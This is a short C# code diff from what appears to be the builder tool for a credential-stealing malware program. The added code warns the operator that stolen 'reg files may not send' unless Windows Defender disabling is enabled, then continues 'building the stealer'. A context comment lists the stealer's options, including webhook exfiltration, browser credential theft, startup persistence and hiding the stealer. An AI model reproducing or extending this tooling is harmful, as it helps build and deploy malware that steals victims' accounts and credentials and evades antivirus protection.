@@ -95,6 +95,17 @@ namespace Z_Builder
                     return;
                 }
             }
+            if (metroCheckBox9.Checked != true)
+            {
+                DialogResult dialogResult = MessageBox.Show("There is a chance that reg files may not send if you dont have Disable WinDefender (feature) enabled. Are you sure you want to continue building the stealer?", "Warning", MessageBoxButtons.YesNo);
+                if (dialogResult == DialogResult.Yes)
+                {
+                }
+                else if (dialogResult == DialogResult.No)
+                {
+                    return;
+                }
+            }
             try { File.Delete(path); } catch { }
             //[ID]==[WebHook_URL]==[Path]==[AAPData]==[Tracer:(Y/N)]--[Recover:(Y/N)]--[GetAllAccs:(Y/N)]--[DeleteGT:(Y/N)]--[StartUp:(Y/N)]--[HideStealer:(Y/N)]--[BrowserCreds:(Y/N)]==[Title]==[Message]==
             string command = "";
